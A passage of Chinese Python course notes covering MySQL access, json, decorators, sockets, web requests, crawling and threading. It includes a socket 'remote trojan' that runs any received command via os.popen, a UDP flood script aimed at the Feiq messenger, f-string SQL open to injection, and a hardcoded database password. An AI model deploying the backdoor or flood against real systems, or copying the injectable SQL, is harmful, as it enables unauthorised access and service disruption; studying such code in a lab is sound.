type="1"><li><code>python</code>中的三种括号</li><li><code>py</code>中的格式化输出</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python">update_mysql<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"insert into user(username,password,role,createtime) "</span></span>                    <span class="token string-interpolation"><span class="token string">f"values('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">', "</span></span><span class="token string-interpolation"><span class="token string">f"'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">', 'user', now())"</span></span><span class="token punctuation">)</span>   <span class="token operator">//</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>中的为变量替代</code></pre><ol start="13" type="1"><li>处理异常</li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.104.130'</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span><span class="token string">'bycz1997'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'learn'</span><span class="token punctuation">,</span> charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span>                       autocommit<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select * from users'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'连接数据库成功'</span><span class="token punctuation">)</span><span class="token keyword">except</span> pymysql<span class="token punctuation">.</span>err<span class="token punctuation">.</span>OperationalError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据库连接不正确'</span><span class="token punctuation">)</span><span class="token keyword">except</span> pymysql<span class="token punctuation">.</span>err<span class="token punctuation">.</span>ProgrammingError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql语句不正确'</span><span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'无论怎样都会执行'</span><span class="token punctuation">)</span></code></pre><blockquote><p>或者<code>raise Exception('xxxxx')</code></p></blockquote><ol start="14" type="1"><li><code>json</code>的处理</li></ol><blockquote><ol type="1"><li>字符串是一种通用的格式</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> 序列化row_list <span class="token operator">=</span> query_mysql<span class="token punctuation">(</span><span class="token string">'select username,password,role from user where userid &lt; 6'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>row_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>row_list<span class="token punctuation">)</span><span class="token punctuation">)</span>jsonStr <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>row_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> 反序列化json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> 对文件的操作，参数两个json<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ol start="15" type="1"><li>装饰器</li></ol><blockquote><ol type="1"><li>一个小问题</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/08/05/idHOeU86CLBsXzj.png"alt="image-20220805142434748" /><figcaption aria-hidden="true">image-20220805142434748</figcaption></figure><blockquote><ol start="2" type="1"><li>代码</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 装饰器</span><span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">stat</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 地址参数</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 闭包</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        func<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 被装饰函数</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span>    <span class="token keyword">return</span> inner<span class="token decorator annotation punctuation">@stat</span><span class="token keyword">def</span> <span class="token function">test02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token number">9999</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> result <span class="token operator">+</span> i <span class="token operator">-</span> result <span class="token operator">*</span> <span class="token number">15</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>test02<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ol start="16" type="1"><li>网络通信与<code>socket</code></li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token comment"># 建立与服务器连接</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.104.131'</span><span class="token punctuation">,</span><span class="token number">554</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token string">'welcome to CAUC'</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义一个服务器</span><span class="token keyword">def</span> <span class="token function">test_server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.245.1'</span><span class="token punctuation">,</span> <span class="token number">555</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        chanel<span class="token punctuation">,</span> client <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> chanel<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>test_server<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/05/rGshuy47eflvkMo.png"alt="image-20220805153732015" /><figcaption aria-hidden="true">image-20220805153732015</figcaption></figure><p>​ 17. 基于<code>socket</code>实现<strong>远程木马</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># server.py</span><span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">normal_talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># s.bind(('127.0.0.1', 6666))      # 只允许本设备访问</span>    s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#  所有IP地址均可访问</span>    s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span>    channel<span class="token punctuation">,</span> client <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 阻塞</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment"># channel, client = s.accept()        # 下次执行时阻塞</span>        receive <span class="token operator">=</span> channel<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"收到消息：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>receive<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        reply <span class="token operator">=</span> receive<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"吗？"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">)</span>        channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>reply<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># s.cloe()                         # 不会执行</span><span class="token keyword">def</span> <span class="token function">attack_talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span>        chanel<span class="token punctuation">,</span> client <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            receive <span class="token operator">=</span> chanel<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10240</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># ==#==,command</span>            <span class="token comment"># ==#==,ipconfig</span>            <span class="token comment"># ==#==,calc.exe</span>            <span class="token comment"># ==#==,==#==,echo msgbox("你中招了") > D:\hi.vbs</span>            <span class="token keyword">if</span> receive<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'==#=='</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                command <span class="token operator">=</span> receive<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                reply <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                chanel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">的运行结果：\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>reply<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"收到消息：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>receive<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                reply <span class="token operator">=</span> receive<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"吗？"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">)</span>                chanel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>reply<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        attack_talk<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># normal_talk()</span>    attack_talk<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># client.py</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    message <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入消息："</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    receive <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10240</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"服务器回复：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>receive<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/05/6XyOnjhYtJwKaHm.png"alt="image-20220805181432045" /><figcaption aria-hidden="true">image-20220805181432045</figcaption></figure><ol start="17" type="1"><li>基于socket 进行<strong>远程攻击</strong></li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 飞秋即时通讯软件</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span> time<span class="token comment"># 模拟高频发送数据包的dos攻击（流量泛宏）</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token operator">=</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.104.131'</span><span class="token punctuation">,</span> <span class="token number">2425</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    packerId <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> <span class="token string">"liuhaihua"</span>    host <span class="token operator">=</span> <span class="token string">"win10"</span>    command <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x00000020</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> <span class="token string">"this is the message from python3.10"</span>    message <span class="token operator">=</span> <span class="token string">"1.0:"</span> <span class="token operator">+</span> packerId <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> command <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> content    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="18" type="1"><li><code>request</code>库处理http</li></ol><blockquote><ol type="1"><li><code>session</code> 和 <code>cookie</code></li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># post请求</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'damin123'</span><span class="token punctuation">,</span> <span class="token string">'verifycode'</span><span class="token punctuation">:</span><span class="token string">'0000'</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://localhost:8080/woniusales/user/login'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'login-pass'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'登录成功'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'登陆失败'</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 下载图片</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.woniunote.com/img/banner-1.jpg'</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./banner.jpg'</span><span class="token punctuation">,</span> mode <span class="token operator">=</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span></code></pre><blockquote><ol start="2" type="1"><li>jdk: <code>javac</code>不是内部或外部命令</li></ol></blockquote><p>写成两行</p><figure><img src="https://s2.loli.net/2022/08/06/rDqsTaukejlpWOn.png"alt="image-20220806145256587" /><figcaption aria-hidden="true">image-20220806145256587</figcaption></figure><blockquote><ol start="3" type="1"><li>tomcat 配置环境变量：<strong>不带<code>bin</code></strong></li></ol></blockquote><figure><img src="https://s2.loli.net/2022/08/06/lNke5E1ZGs9HWrv.png"alt="配置java环境变量" /><figcaption aria-hidden="true">配置java环境变量</figcaption></figure><blockquote><ol start="4" type="1"><li>在登录的基础上</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 登录成功后获取相应的cookie,用于在后续请求中使用</span>cookie <span class="token operator">=</span> resp<span class="token punctuation">.</span>cookies<span class="token comment"># 文件上传</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'batchfile'</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'E:/other/SaleList-20171020-Test.xls'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'batchname'</span><span class="token punctuation">:</span><span class="token string">"GB20211009"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://localhost:8080/woniusales/goods/upload'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># 还有另一种维持session的用法</span></code></pre><pre class="language-none"><code class="language-none"># 处理https请求加参数：verify&#x3D;False</code></pre><ol start="19" type="1"><li>基于正则表达式的爬虫</li></ol><blockquote><ol type="1"><li><code>robots</code>协议</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">download_page</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.woniunote.com/'</span><span class="token punctuation">)</span>    links <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;a href="(.+?)"'</span><span class="token punctuation">,</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">for</span> link <span class="token keyword">in</span> links<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'articleid'</span> <span class="token keyword">in</span> link <span class="token keyword">or</span> link<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> link<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            link <span class="token operator">=</span> <span class="token string">'http://www.woniunote.com/'</span> <span class="token operator">+</span> link        <span class="token keyword">print</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span>        <span class="token comment">#  将页面文件保存于本地</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>link<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>        filename <span class="token operator">=</span> link<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"_%Y%m%d_%H%M%S"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.html'</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"./woniunote/page/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># 下载图片同理</span></code></pre><ol start="20" type="1"><li><code>beautifulsoup4</code></li></ol><blockquote><ol type="1"><li><strong>换源安装 ：</strong>pip install django -ihttps://pypi.tuna.tsinghua.edu.cn/simple</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> requestsresp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.woniunote.com/'</span><span class="token punctuation">)</span><span class="token comment"># 初始化解析器</span>html <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>head<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>head<span class="token punctuation">.</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>div<span class="token punctuation">.</span>div<span class="token punctuation">.</span>div<span class="token punctuation">)</span><span class="token comment"># find_all, select</span><span class="token comment"># # 查找页面所有链接</span>links <span class="token operator">=</span> html<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> link <span class="token keyword">in</span> links<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>link<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># 图片同理</span><span class="token comment"># 根据id或class属性</span><span class="token comment"># # 根据xpath风格进行查找 </span>titles <span class="token operator">=</span> html<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'class'</span><span class="token punctuation">:</span><span class="token string">'title'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">for</span> title <span class="token keyword">in</span> titles<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token comment"># 根据css选择器</span>titles <span class="token operator">=</span> html<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'div.title'</span><span class="token punctuation">)</span><span class="token keyword">for</span> title <span class="token keyword">in</span> titles<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span></code></pre><ol start="21" type="1"><li>多线程与流量泛洪</li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span> time<span class="token comment"># 单线程情况下，5s</span><span class="token keyword">def</span> <span class="token function">test_01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 使用多线程的方式输入5次时间</span><span class="token keyword">def</span> <span class="token function">test_02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># test_01()</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>test_02<span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/06/ueXb7EQvowzmZWD.png"alt="image-20220806214847628" /><figcaption aria-hidden="true">image-20220806214847628</figcaption></figure><ol start="21" type="1"><li>基于<code>selenium</code>操作web界面</li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> 